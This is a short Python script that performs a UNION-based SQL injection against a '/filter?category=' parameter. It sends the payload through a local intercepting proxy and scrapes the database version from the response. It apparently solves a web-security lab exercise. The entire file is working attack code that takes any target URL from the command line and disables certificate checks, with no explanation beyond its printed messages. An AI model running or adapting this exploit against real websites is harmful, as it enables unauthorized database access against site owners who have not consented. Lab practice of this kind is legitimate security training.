import requests
import sys
import urllib3
from bs4 import BeautifulSoup as BS
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    path = '/filter?category='
    sql_payload = "' UNION SELECT @@version, NULL%23" # '#' == %23 in url form
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BS(res, 'html.parser')
    version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))

    if version is None:
        return False
    else:
        print('[+] Found the data base version string.')
        time.sleep(5)
        print(f'[+] The version string of the database is: {version}')
        return True


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    print('[+] Dumping the version string of the database...')
    if not exploit_sqli_version(url):
        print('[-] Unable to dump the database version string.')

